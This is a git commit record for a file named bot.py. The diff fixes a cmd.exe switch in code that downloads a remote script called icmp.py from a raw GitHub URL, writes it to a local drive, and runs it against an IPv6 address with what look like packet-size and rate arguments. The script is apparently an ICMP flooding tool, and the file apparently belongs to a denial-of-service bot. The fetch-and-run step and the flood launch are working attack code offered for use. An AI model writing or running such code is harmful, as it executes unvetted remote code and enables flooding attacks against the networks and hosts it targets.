aa8f113d84a896af17ec875ad5834a86f45a4f6b
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2025-08-14 09:21:28 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -9,4 +9,4 @@ except:
 with open('D:\\icmp.py','w') as f:
     f.write(requests.get('https://raw.githubusercontent.com/Hex1629/pretest/refs/heads/main/icmp.py').text)
 
-os.system('cmd.exe \k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 2500 ERQ 2500')
+os.system('cmd.exe /k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 2500 ERQ 2500')
